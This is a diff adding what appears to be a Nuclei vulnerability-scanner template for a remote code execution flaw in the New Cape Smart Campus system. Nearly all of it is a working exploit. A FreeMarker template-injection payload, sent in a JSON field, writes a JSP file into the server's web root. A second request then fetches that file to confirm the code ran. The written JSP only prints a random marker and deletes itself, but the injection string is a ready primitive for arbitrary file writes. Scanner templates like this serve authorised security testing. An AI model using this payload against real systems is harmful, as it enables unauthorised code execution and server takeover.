@@ -1,0 +1,50 @@
+id: newcape-smartcampus-rce
+info:
+  name: New Cape Smart Campus RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    New Cape Smart Campus System contains a remote code execution vulnerability.
+    Attackers can exploit this vulnerability to execute arbitrary code on the server,
+    potentially leading to full server control.
+  reference:
+    - http://www.newcapec.com.cn/
+  classification:
+    cvss-score: 9.8
+  tags: rce,file-upload
+
+variables:
+  random_filename: '{{rand_text_alphanumeric(16)}}.jsp'
+  random_content: '<% out.println("{{rand_text_alphanumeric(16)}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>'
+
+http:
+  - raw:
+      - |
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command": "GetFZinfo", "UnitCode": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.io.FileWriter\",'./webapps/ROOT/{{random_filename}}').append('{{random_content}}').close()}"}
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: json
+        json:
+          - '.command'
+        internal: true
+
+  - raw:
+      - |
+        GET /{{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_content}}"
+        part: body
